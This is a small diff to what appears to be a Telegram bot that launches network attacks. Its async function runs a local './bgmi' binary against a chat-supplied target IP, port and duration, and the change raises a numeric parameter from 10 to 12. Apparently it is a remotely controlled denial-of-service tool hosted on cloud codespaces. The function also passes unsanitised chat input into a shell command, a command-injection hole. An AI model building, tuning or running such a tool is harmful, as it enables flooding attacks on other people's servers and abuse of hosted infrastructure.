@@ -5,7 +5,7 @@ from telebot import TeleBot
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(bot: TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
-    command = f"./bgmi {target_ip} {target_port} {duration} 10"
+    command = f"./bgmi {target_ip} {target_port} {duration} 12"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
